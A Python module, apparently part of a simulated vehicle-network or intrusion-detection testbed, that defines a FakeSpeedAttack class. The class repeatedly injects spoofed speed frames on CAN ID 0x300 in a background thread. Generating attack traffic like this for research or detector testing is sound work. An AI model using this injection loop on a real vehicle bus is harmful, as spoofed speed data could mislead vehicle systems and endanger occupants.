import logging
import threading
import time

from src.networking.can_interface import CANInterface


logger = logging.getLogger(__name__)


class FakeSpeedAttack:
    """
    Simulates a fake-speed CAN attack.

    Sends abnormal speed values using the Speed ECU CAN ID (0x300).
    """

    CAN_ID = 0x300

    def __init__(
        self,
        bus: CANInterface,
        fake_speed: int = 250,
        interval: float = 0.2,
    ):
        self.bus = bus
        self.fake_speed = fake_speed
        self.interval = interval

        self.running = False
        self.thread: threading.Thread | None = None

    def start(self) -> None:
        """Start the fake-speed attack."""

        if self.running:
            logger.warning("Fake Speed Attack is already running.")
            return

        self.running = True

        self.thread = threading.Thread(
            target=self._attack_loop,
            name="FakeSpeedAttack",
            daemon=True,
        )

        self.thread.start()

        logger.warning(
            "Fake Speed Attack started: CAN ID=0x300 SPEED=%d",
            self.fake_speed,
        )

    def stop(self) -> None:
        """Stop the fake-speed attack."""

        self.running = False

        if self.thread is not None:
            self.thread.join(timeout=2.0)

        logger.warning("Fake Speed Attack stopped.")

    def _attack_loop(self) -> None:
        """Continuously inject fake speed messages."""

        while self.running:
            try:
                speed = max(0, min(self.fake_speed, 255))

                self.bus.send(
                    arbitration_id=self.CAN_ID,
                    data=[speed, 0, 0, 0, 0, 0, 0, 0],
                )

                logger.warning(
                    "FAKE SPEED INJECTION -> ID=0x300 SPEED=%d",
                    speed,
                )

                time.sleep(self.interval)

            except Exception:
                logger.exception("Error during Fake Speed Attack.")
                break
